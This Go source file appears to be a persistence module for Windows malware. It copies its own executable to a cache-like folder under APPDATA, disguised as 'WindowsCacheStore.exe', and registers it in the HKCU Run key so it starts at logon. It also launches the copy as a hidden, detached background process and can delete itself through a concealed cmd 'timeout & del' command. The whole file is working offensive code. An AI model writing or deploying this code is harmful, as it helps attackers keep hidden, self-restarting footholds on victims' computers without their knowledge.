package main

import (
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "syscall"

    "golang.org/x/sys/windows/registry"
)

const (
    persistRunKey  = `Software\Microsoft\Windows\CurrentVersion\Run`
    persistRunVal  = "WindowsCacheStore"
    persistSubDir  = `Microsoft\\Windows\\INetCache\\Content.MSO`
    persistExeName = "WindowsCacheStore.exe"
)

func persistedPath() string {
    appData := os.Getenv("APPDATA")
    if appData == "" {
        return ""
    }
    return filepath.Join(appData, persistSubDir, persistExeName)
}

func IsPersistenceInstalled() bool {
    dest := persistedPath()
    if dest == "" {
        return false
    }
    if _, err := os.Stat(dest); err != nil {
        return false
    }
    k, err := registry.OpenKey(registry.CURRENT_USER, persistRunKey, registry.QUERY_VALUE)
    if err != nil {
        return false
    }
    defer k.Close()
    v, _, err := k.GetStringValue(persistRunVal)
    if err != nil {
        return false
    }
    return strings.EqualFold(v, dest)
}

func InstallPersistence() error {
    self, err := os.Executable()
    if err != nil {
        return fmt.Errorf("locate self: %w", err)
    }
    if resolved, err := filepath.EvalSymlinks(self); err == nil {
        self = resolved
    }

    dest := persistedPath()
    if dest == "" {
        return fmt.Errorf("APPDATA not set")
    }
    if err := os.MkdirAll(filepath.Dir(dest), 0755); err != nil {
        return fmt.Errorf("mkdir: %w", err)
    }

    if !strings.EqualFold(self, dest) {
        data, err := os.ReadFile(self)
        if err != nil {
            return fmt.Errorf("read self: %w", err)
        }
        if err := os.WriteFile(dest, data, 0755); err != nil {
            return fmt.Errorf("write dest: %w", err)
        }
    }

    k, _, err := registry.CreateKey(registry.CURRENT_USER, persistRunKey, registry.SET_VALUE)
    if err != nil {
        return fmt.Errorf("open Run: %w", err)
    }
    defer k.Close()
    if err := k.SetStringValue(persistRunVal, dest); err != nil {
        return fmt.Errorf("set Run: %w", err)
    }
    return nil
}

func SpawnPersistedCopy() error {
    dest := persistedPath()
    if dest == "" {
        return fmt.Errorf("no persisted path")
    }
    cmd := exec.Command(dest, "--no-persist", "--daemon")
    cmd.SysProcAttr = &syscall.SysProcAttr{
        HideWindow:    true,
        CreationFlags: 0x00000008 | 0x00000200,
    }
    cmd.Stdin = nil
    cmd.Stdout = nil
    cmd.Stderr = nil
    return cmd.Start()
}

func RemovePersistence() {
    if k, err := registry.OpenKey(registry.CURRENT_USER, persistRunKey, registry.SET_VALUE); err == nil {
        _ = k.DeleteValue(persistRunVal)
        k.Close()
        fmt.Println("[+] Removed HKCU Run entry")
    }

    dest := persistedPath()
    if dest == "" {
        return
    }

    self, _ := os.Executable()
    if resolved, err := filepath.EvalSymlinks(self); err == nil {
        self = resolved
    }

    if strings.EqualFold(self, dest) {
        cmd := exec.Command("cmd", "/c",
            fmt.Sprintf("timeout /t 2 /nobreak >nul & del /f /q \"%s\"", dest))
        cmd.SysProcAttr = &syscall.SysProcAttr{
            HideWindow:    true,
            CreationFlags: 0x00000008 | 0x00000200,
        }
        _ = cmd.Start()
        fmt.Println("[+] Scheduled self-delete")
    } else {
        if err := os.Remove(dest); err == nil {
            fmt.Println("[+] Deleted persisted copy")
        }
    }
}

